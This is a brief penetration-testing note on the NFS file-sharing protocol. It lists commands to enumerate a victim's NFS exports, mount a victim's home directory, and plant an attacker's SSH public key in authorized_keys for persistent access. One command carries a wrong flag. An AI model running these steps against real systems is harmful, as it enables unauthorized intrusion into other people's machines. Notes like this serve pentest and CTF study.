port: 2049

Network File System

similar to smb, this nfs is used to share the files, over the network  on linux OS.

It is a file sharing protocol

For checking nfs configuration:
```
showmount -e <Victum IP>
```

/etc/exports

```
mkdir /mnt/<any_folder_name>
```

```
sudo mount -t nfs <Victum IP>:/home/sysadmin /mnt/blind_spot
```


We can also upload our own ssh keys in nfs

- Create .ssh directory
- Then inside .ssh create authorize_keys file
- Then in yout attacker machine generate keys using
  ```
  ssh-keygen -i rsa -f /tmp/pwn_key
  ```
- Then copy that generated .pub key in the victum authorize_keys file